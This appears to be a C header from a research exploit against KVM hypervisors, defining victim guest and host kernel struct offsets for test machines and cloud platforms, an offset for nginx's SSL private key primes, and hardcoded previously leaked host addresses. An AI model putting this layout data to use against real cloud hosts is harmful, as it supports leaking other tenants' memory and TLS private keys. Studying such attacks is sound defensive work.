#pragma once
#include <stdint.h>
#include "config.h"
#include "helpers.h"

typedef uint64_t u64; // virtual address
typedef unsigned long va_t; // virtual address
typedef unsigned long pa_t; // physical address
typedef unsigned long gva_t; // guest virtual address
typedef unsigned long gpa_t; // guest physical address
typedef unsigned long hva_t; // host virtual address
typedef unsigned long hpa_t; // host physical address
typedef unsigned long pte_t; // page table entry - pfn is host physical


/******************************************************************************
 ************************  Victim Guest Kernel Layout  ************************
 ******************************************************************************/

#define G_TEXT_INIT_TASK	0x1c112c0	// struct task_struct init_task

// struct task_struct {
#define G_TASK_TASKS		0x8f0	// struct list_head tasks
#define G_TASK_MM		0x940	// struct mm_struct *mm
#define G_TASK_PID		0x9c0	// pid_t pid, tgid
#define G_TASK_PID_LINKS	0x9f8	// struct hlist_node pid_links[PIDTYPE_MAX] <-- PID_TASKS
#define G_TASK_COMM		0xba8	// char comm[TASK_COMM_LEN]
// };
#define G_TASK_COMM_LEN		0x10

// struct mm_struct {
#define G_MM_PGD		0x78	// pgd_t *pgd
#define G_MM_HEAP		0x158	// unsigned long start_brk
// };

#define NGINX_SSLKEY		0x8b9a3
#define SSLKEY_LEN		(128 + 4 + 128) // prime1 + magic + prime2
#define SSLKEY_MAGIC		0x00818102

#if MACHINE == FATHER
#undef G_MM_HEAP
#undef NGINX_SSLKEY
#define G_MM_HEAP		0x158 + 0x10 // start_arg
#define NGINX_SSLKEY		0x0  // start of arg
#endif


/******************************************************************************
 ************************  Victim Host Kernel Layout  *************************
 ******************************************************************************/

#if MACHINE == FATHER

#define OWN_TASK_NAME		"qemu-system-x86"

// struct kvm_apic_map {
#define H_MAP_PHYS_MAP		0x218	// struct kvm_lapic *phys_map[max_apic_id+1]
// };

// struct kvm_lapic {
#define H_LAPIC_BASE_ADDR	0x0	// u64 base_address == 0xfee00000
#define H_LAPIC_VCPU		0x90	// struct kvm_vcpu *vcpu
// };

// struct kvm_vcpu {
#define H_VCPU_KVM		0x0	// struct kvm *kvm
#define H_VCPU_PID		0x78	// struct pid *pid
#define H_VCPU_ARCH		0x120	// struct kvm_vcpu_arch arch
// };

// struct pid {
#define H_PID_TASKS		0x20	// struct hlist_head tasks[PIDTYPE_MAX] --> TASK_PID_LINKS
// };

// struct task_struct {
#define H_TASK_TASKS		0x900	// struct list_head tasks
#define H_TASK_MM		0x950	// struct mm_struct *mm
#define H_TASK_PID		0x9d0	// pid_t pid, tgid
#define H_TASK_PID_LINKS	0xa40	// struct hlist_node pid_links[PIDTYPE_MAX] <-- PID_TASKS
#define H_TASK_COMM		0xbf0	// char comm[TASK_COMM_LEN]
// };
#define H_TASK_COMM_LEN		0x10

// struct mm_struct {
#define H_MM_PGD		0x78	// pgd_t *pgd
// };

// struct kvm_vcpu_arch {
#define H_ARCH_CR3		0xa0	// unsigned long cr3
#define H_ARCH_MMU		0x168	// struct kvm_mmu *mmu --> ARCH_ROOT_MMU
#define H_ARCH_ROOT_MMU		0x170	// struct kvm_mmu root_mmu
// }

// struct kvm_mmu {
#define H_MMU_ROOT		0x30	// struct kvm_mmu_root_info root;
// }

// struct kvm_mmu_root_info {
#define H_INFO_HPA		0x8	// hpa_t hpa;
// };

// struct kvm {
#define H_KVM_VCPU_ARRAY	0x1128	// struct xarray vcpu_array
#define H_KVM_VM_LIST		0x1178	// struct list_head vm_list
// };

// struct xarray {
#define H_XARRAY_HEAD		0x8	// void __rcu *xa_head
// };

#elif MACHINE == GCE

#define OWN_TASK_NAME		"VCPU-0"

// struct kvm_apic_map {
#define H_MAP_PHYS_MAP		0x218   // struct kvm_lapic *phys_map[max_apic_id+1]
// };

// struct kvm_lapic {
#define H_LAPIC_BASE_ADDR	0x0	// u64 base_address == 0xfee00000
#define H_LAPIC_VCPU		0x88	// struct kvm_vcpu *vcpu
// };

// struct kvm_vcpu {
#define H_VCPU_KVM		0x0	// struct kvm *kvm
#define H_VCPU_PID		0x90	// struct pid *pid
#define H_VCPU_ARCH		0x120	// struct kvm_vcpu_arch arch
// };

// struct pid {
#define H_PID_TASKS		0x10	// struct hlist_head tasks[PIDTYPE_MAX] --> TASK_PID_LINKS
// };

// struct task_struct {
#define H_TASK_PRIOS		0x64	// int static_prio, normal_prio, rt_priority
#define H_TASK_TASKS		0x900	// struct list_head tasks
#define H_TASK_MM		0x950	// struct mm_struct *mm
#define H_TASK_PID_LINKS	0xa78	// struct hlist_node pid_links[PIDTYPE_MAX] <-- PID_TASKS
#define H_TASK_COMM		0xc38	// char comm[TASK_COMM_LEN]
// };
#define H_TASK_COMM_LEN		0x10

// struct mm_struct {
#define H_MM_PGD		0x80	// pgd_t *pgd
// };

// struct kvm_vcpu_arch {
#define H_ARCH_CR3		0xa0	// unsigned long cr3
#define H_ARCH_MMU		0x168	// struct kvm_mmu *mmu --> ARCH_ROOT_MMU
#define H_ARCH_ROOT_MMU		0x170	// struct kvm_mmu root_mmu
// }

// struct kvm_mmu {
#define H_MMU_ROOT		0x40	// struct kvm_mmu_root_info root;
// }

// struct kvm_mmu_root_info {
#define H_INFO_HPA		0x8	// hpa_t hpa;
// };

// struct kvm { // TODO: THESE ARE ONLY THE PUXS:~/GIT/LINUX OFFSETS!!!
#define H_KVM_VCPU_ARRAY	0x1128	// struct xarray vcpu_array
#define H_KVM_VM_LIST		0x1178	// struct list_head vm_list
// };

// struct xarray {
#define H_XARRAY_HEAD		0x8	// void __rcu *xa_head
// };

#endif // MACHINE


/******************************************************************************
 ************************  Previously Leaked Results  *************************
 ******************************************************************************/

#if LEAK == SKIP || LEAK == CHEAT_NOISY

#if MACHINE == FATHER
#define BASE		0x2dd2ae218
#define HOST_DIRECT_MAP	0xffffa03300000000
#define OWN_VCPU	0xffffa03509eea300
#define OWN_TASK	0xffffa0340565afb0
#define OWN_KVM		0xffffb1b08d9f5000
#define VICTIM_KVM	0xffffb1b08ef31000
#define HCR3		0x426d18000
#define VICTIM_VCPU	0xffffa03509694600
#define EPTP		0x10209e000
#define GCR3		0x279a42000
#define GTEXT		0xffffffffa7c00000
#define NGINX		0x1f93dc100
#elif MACHINE == GCE
#define BASE 0x88d43f218
#define OWN_TASK 0xffff936a91dba000
#elif MACHINE == AWS
#define BASE 0xa1d34218
#endif // MACHINE

#elif LEAK == CHEAT || LEAK == CHEAT_NOISY

#define BASE (helper_base_pa())
#define HOST_DIRECT_MAP (hc_direct_map())

#endif // LEAK


void get_feeling_for_kernel_kvm_data_structures(void);
void reverse_host_kernel_data_structures(void);
